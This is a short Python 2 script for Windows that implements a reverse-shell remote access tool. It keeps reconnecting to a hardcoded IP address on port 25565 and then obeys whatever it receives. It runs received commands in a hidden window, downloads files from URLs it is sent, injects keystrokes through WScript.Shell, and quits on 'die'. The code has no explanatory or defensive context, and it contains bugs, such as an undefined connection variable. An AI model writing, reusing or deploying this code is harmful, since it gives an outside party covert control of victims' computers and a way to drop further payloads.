import os, socket, subprocess, urllib, sys, win32com.client

host = "96.239.90.68"
port = 25565
s = socket.socket()

shell = win32com.client.Dispatch("WScript.Shell")

def connect():
    while True:
        try:
            s.connect((host, port))
            break
        except: pass

connect()

while True:
    try:
        data = s.recv(9600)
        if data == "die": break
        
        elif data == "": pass
        
        elif data[0:2] == "dl":
            testfile = urllib.URLopener()
            testfile.retrieve(data[2:], data.split("/")[-1])
            
        elif data[0:3] == "key":
            shell.sendKeys(data[4:])
            
        else:
            CREATE_NO_WINDOW = 0x08000000
            print subprocess.check_output(data, creationflags=CREATE_NO_WINDOW, shell=True)
    except:
        conn.close()
        connect()

conn.close()
sys.exit()
